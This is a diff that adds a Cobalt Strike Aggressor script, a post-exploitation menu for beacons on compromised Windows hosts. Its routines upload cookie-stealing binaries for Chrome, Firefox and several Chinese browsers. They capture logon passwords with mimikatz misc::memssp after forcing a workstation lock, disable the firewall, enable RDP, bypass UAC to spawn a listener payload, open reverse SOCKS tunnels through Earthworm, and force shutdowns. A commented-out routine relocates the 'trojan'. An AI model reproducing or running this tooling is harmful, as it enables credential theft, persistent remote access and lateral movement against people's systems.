@@ -1,0 +1,238 @@
+#define functions
+
+
+sub Exec_sharpshell{
+    local('$fpath $fname');
+    $fpath = $3['file'];
+    $fname = getFileName(replace($fpath, '\\\\', "/"));
+    bupload($bid, $fpath);
+    bexecute_assembly($bid, script_resource("post/Sharpshell.exe"), "\"".$fname."\"");
+    bshell($bid,"del /F /S /Q $fname");
+}
+
+sub Steal_cookies{
+    local('$type $prefix $isnew $cmd $isup $redirect $redbox');
+    $type = lc($3['type']);
+    $prefix = $3['prefix'];
+    $isnew = lc($3['isnew']);
+    $isup = lc($3['isup']);
+    $redirect = $3['redirect'];
+    $redbox = $3['redbox'];
+    if ($type eq "Firefox"){
+        $cmd = "cookies.exe firefox  $+ $prefix";
+    }
+    else if ($type eq "chrome"){
+        if ($isnew eq "true"){
+            $cmd = "chrome80.exe";
+            
+        }
+        else{
+            $cmd = "cookies.exe chrome";
+        }
+    }
+    else {
+        $cmd = "cookies.exe  $+ $type";
+    }
+    if ($redbox eq "true"){
+        $cmd = "$cmd >  $+ $redirect";
+    }
+    if ($isup eq "true"){
+        bshell($bid, $cmd);
+    }
+    else{
+        bupload($bid, script_resource("gather/chrome80.exe"));
+        bupload($bid, script_resource("gather/cookies.exe"));
+        bshell($bid, $cmd);
+    }
+}
+
+sub Steal_windows_password{
+    $bid = $1['@'];
+    bmimikatz($bid, "misc::memssp");
+    brun($bid,"rundll32.exe user32.dll,LockWorkStation");
+    show_message("After the administrator logs in again, check C:\\Windows\\System32\\mimilsa.log");
+}
+
+sub Close_firewall{
+   $ver = beacon_info($1['@'],"ver");
+   if (double($ver) lt 5.2){
+       brun($1, "netsh firewall set opmode disable");
+       return;
+   }
+   brun($1, "netsh advfirewall set allprofiles state off");
+}
+sub Open_rdp{
+   $ver = beacon_info($1['@'],"ver");
+   if (double($ver) lt 5.2){
+       brun($1, "wmic path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1");
+       return;
+   }
+   brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1");
+   brun($1, "wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1");
+   brun($1, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+}
+
+# sub Migrate{
+#     $dir = $3['dir'];
+#     $process = $3['pname'];
+#     $current_pro = beacon_info($bid, "process");
+#     $pid = beacon_info($bid, "pid");
+#     $keep = $3['keep'];
+#     $cmd = "mkdir ".$dir." || copy /y ".$current_pro."  ".$dir.$process." && start ".$dir.$process." && taskkill /F /PID ".$pid." && del /F ".$current_pro;
+#     if ($keep eq "true"){
+#         $cmd = "mkdir ".$dir." || copy /y ".$current_pro."  ".$dir.$process." && start ".$dir.$process;
+#     }
+#     bshell!($bid,$cmd);
+#     btask($bid, "migrating process location to ".$dir.$process.", please wait new session !", "");
+# }
+
+sub Earthworm{
+    local('$type $lport $refhost $refport $rch');
+    $type = $3['type'];
+    $lport = $3['listenport'];
+    $refhost = $3['refhost'];
+    $refport = $3['refport'];
+    $rch = "x86";
+    if (beacon_info($bid,"is64") == 1){
+        $rch = "x64";
+    }
+    bupload!($bid, script_resource("post/ew/ $+ $rch $+ .exe"));
+    if($type eq "Forward"){
+        bshell!($bid, $rch.".exe -s ssocksd -l ".$lport);
+        btask($bid, "Started socks5 server at: ".beacon_info($bid, "external").":".$lport);
+    }
+    else{
+        bshell!($bid, $rch.".exe -s rssocks -d ".$refhost." -e ".$refport);
+        btask($bid, "Started socks5 server at: ".$refhost.":".$refport);
+    }
+}
+
+sub UacviaProgIDs{
+    local('$type $bin $listener $arg $fname');
+    $type = $3['type'];
+    $bin = $3['path'];
+    $listener = $3['listener'];
+    $fname = Getname().".cmd";
+    $rfname = "C:\\Users\\Public\\Documents\\".$fname;
+    if($type eq "RunBin" && $bin ne ""){
+        btask($bid, "Tasked Beacon to run Bypass UAC via ProgIDs");
+        $arg = join(' ', @($bin));
+        bexecute_assembly!($bid, script_resource("post/ProgIDsUACBypass.exe"),$arg);
+    }
+    else if($type eq "Spawn" && $listener ne ""){
+        btask($bid, "Tasked Beacon to run " . listener_describe($listener) . " Bypass UAC via ProgIDs");
+        $payload = powershell($listener, false);
+        bupload_raw!($bid,$rfname,$payload);
+        $arg = join(' ', @($rfname));
+        bexecute_assembly!($bid, script_resource("post/ProgIDsUACBypass.exe"),$arg);
+        bshell!($bid,"cmd.exe /C del /F ".$rfname);
+    }
+    else{
+        show_error("Error");
+    }
+}
+#append menus
+
+
+
+    menu "Post"{
+        
+            item "Turn Off Firewall"{
+                if (!-isadmin $1['@']){
+                    show_error("Permission Denied!");
+                    return;
+                }
+                Close_firewall($1);
+            }
+
+            item "Enable RDP"{
+                local('$bid');
+                $bid = $1;
+                if (!-isadmin $bid['@']){
+                    show_error("Permission Denied!");
+                    return;
+                }
+                Open_rdp($1);
+            }
+
+            menu "Power"{
+                item "Restart"{
+                    bshell($1,"shutdown -r -t 0");
+                }
+                item "Power off"{
+                    bshell($1,"shutdown -s -t 0");
+                }
+            }
+
+
+            menu "UAC"{
+                item "Bypass uac via ProgIDs"{
+                    $bid = $1['@'];
+                    $dialog = dialog("Bypass UAC via ProgIDs",%(bid => $bid, path => 'C:\\Windows\\System32\\notepad.exe'), &UacviaProgIDs);
+                    dialog_description($dialog, "Bypass UAC via ProgIDs.");
+                    drow_combobox($dialog,"type","Type: ", @("RunBin", "Spawn"));
+                    drow_text($dialog,"path","Bin path(type 1): ");
+                    drow_listener($dialog, "listener", "Listener(type 2): ");
+                    dbutton_action($dialog, "Go");
+                    dialog_show($dialog); 
+                }
+            }
+            
+            item "Sharpshell"{
+                $bid = $1['@'];
+                $dialog = dialog("SharpShell",%(bid => $bid), &Exec_sharpshell);
+                dialog_description($dialog, "Execute powershell code without powershell.");
+                drow_file($dialog, "file", "Choose: ");
+                dbutton_action($dialog, "Go");
+                dialog_show($dialog); 
+            }
+
+            item "Steal-cookie"{
+                show_message("It is recommended to manually upload the files under the gather folder before using this function !");
+                $bid = $1['@'];
+                $dialog = dialog("Steal cookies",%(bid => $bid, isnew => "False", redirect => "Output.txt"), &Steal_cookies);
+                dialog_description($dialog, "Stealing cookies from a browser stored in a local database.");
+                drow_combobox($dialog, "type", "Type: ", @("Firefox", "Chrome", "2345", "QQ", "360", "360cse", "Sogou"));
+                drow_text($dialog, "prefix", "Prefix: ");
+                drow_combobox($dialog, "isnew", "80.x: ", @("True", "False"));
+                drow_combobox($dialog, "isup", "Isuploaded: ", @("True", "False"));
+                drow_checkbox($dialog, "redbox", "Output redirection: ", "");
+                drow_text($dialog, "redirect", "");
+                dbutton_action($dialog, "Exec");
+                dialog_show($dialog);
+            }
+
+            item "Steal-windows-password"{
+                Steal_windows_password($1);
+            }
+
+
+            # item "Migrate"{
+            #     local('$process');
+            #     $bid = $1['@'];
+            #     $process = Getname().".exe";
+            #     $dir = Getinfo()[1];
+            #     $dialog = dialog("Migrate process",%(bid => $bid, dir => $dir, pname => $process, keep => "true"), &Migrate);
+            #     dialog_description($dialog, "Migrate your trojan to another directory and then reconnect a new session, only native sessions are supported and can only be migrated once");
+            #     drow_text($dialog, "dir", "Migrate directory: ");
+            #     drow_text($dialog, "pname", "Process name: ");
+            #     drow_checkbox($dialog, "keep", "Keep old connection: ", "");
+            #     dbutton_action($dialog, "Exec");
+            #     dialog_show($dialog);
+            # }
+            menu "Socks Server" {
+
+                item "Earthworm"{
+                    $bid = $1['@'];
+                    $dialog = dialog("Create socks server",%(bid => $bid, listenport => "1080", refhost => "1.1.1.1", refport => "8888"), &Earthworm);
+                    dialog_description($dialog,"Create a forward or reverse socks5 server use Earthworm.");
+                    drow_combobox($dialog, "type", "Type: ", @("Forward", "Reverse"));
+                    drow_text($dialog, "listenport", "Listen port(-l): ", "");
+                    drow_text($dialog, "refhost", "Reflection host address(-d): ", "");
+                    drow_text($dialog, "refport", "Reflection port(-e): ", "");
+                    dbutton_action($dialog, "Exec");
+                    dialog_show($dialog);
+                }
+            }
+            
+    }
